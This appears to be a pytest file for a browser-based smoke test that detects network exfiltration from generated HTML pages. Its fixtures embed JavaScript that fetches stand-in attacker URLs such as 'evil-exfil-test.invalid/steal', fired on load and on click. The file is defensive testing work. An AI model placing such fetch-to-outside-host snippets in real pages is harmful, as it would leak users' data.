"""Sprint 3 Part A: smoke_test.py runtime network-egress check + synthetic
interaction, so a JS-obfuscated exfiltration URL (never a literal string in
the HTML source for safety.py to match) still gets caught."""

import pytest

import smoke_test

pytest.importorskip("playwright.sync_api")


def _has_chromium():
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch()
            browser.close()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _has_chromium(), reason="Chromium not installed")


# --- _blocked_host(): allowlist logic, testable without a browser ---------

def test_blocked_host_flags_disallowed_https_host():
    assert smoke_test._blocked_host("https://evil.tld/exfil?x=1") == "evil.tld"


def test_blocked_host_allows_allowlisted_cdn_host():
    assert smoke_test._blocked_host("https://cdn.jsdelivr.net/npm/foo/bar.js") is None


def test_blocked_host_ignores_file_uri():
    assert smoke_test._blocked_host("file:///tmp/index.html") is None


def test_blocked_host_ignores_data_uri():
    assert smoke_test._blocked_host("data:image/png;base64,AAAA") is None


def test_blocked_host_ignores_blob_uri():
    assert smoke_test._blocked_host("blob:https://example.com/uuid") is None


# --- run_smoke_test(): end-to-end via headless Chromium --------------------

def test_flags_onload_fetch_to_disallowed_host(tmp_path):
    html = tmp_path / "index.html"
    html.write_text(
        "<script>fetch('https://evil-exfil-test.invalid/steal?x=1')"
        ".catch(()=>{});</script>",
        encoding="utf-8",
    )
    passed, detail = smoke_test.run_smoke_test(str(html), timeout_seconds=10)
    assert passed is False
    assert "blocked network request" in detail
    assert "evil-exfil-test.invalid" in detail


def test_passes_clean_game(tmp_path):
    html = tmp_path / "index.html"
    html.write_text("<canvas></canvas><script>console.log('ok');</script>", encoding="utf-8")
    passed, detail = smoke_test.run_smoke_test(str(html), timeout_seconds=10)
    assert passed is True


def test_flags_onclick_exfiltration_via_synthetic_click(tmp_path):
    """Exfiltration gated behind a click still gets caught because
    run_smoke_test() dispatches a synthetic click before its wait."""
    html = tmp_path / "index.html"
    html.write_text(
        "<body onclick=\"fetch('https://evil-onclick-test.invalid/x').catch(()=>{})\">"
        "<div style='width:100vw;height:100vh'></div></body>",
        encoding="utf-8",
    )
    passed, detail = smoke_test.run_smoke_test(str(html), timeout_seconds=10)
    assert passed is False
    assert "blocked network request" in detail


def test_onclick_exfiltration_not_caught_without_synthetic_interaction(tmp_path):
    """Regression check documenting why the synthetic click/keypress step in
    run_smoke_test() exists: a bare load-and-wait (no interaction) misses
    exfiltration gated behind a click entirely."""
    from playwright.sync_api import sync_playwright

    html = tmp_path / "index.html"
    html.write_text(
        "<body onclick=\"fetch('https://evil-onclick-test.invalid/x').catch(()=>{})\">"
        "<div style='width:100vw;height:100vh'></div></body>",
        encoding="utf-8",
    )
    errors = []
    with sync_playwright() as p:
        browser = p.chromium.launch()
        try:
            page = browser.new_page()
            page.on("pageerror", lambda exc: errors.append(str(exc)))
            page.on(
                "request",
                lambda req: errors.append(req.url)
                if smoke_test._blocked_host(req.url) else None,
            )
            page.goto(f"file://{html.resolve()}", timeout=10000)
            page.wait_for_timeout(1000)  # no click/keypress dispatched
        finally:
            browser.close()
    assert errors == []
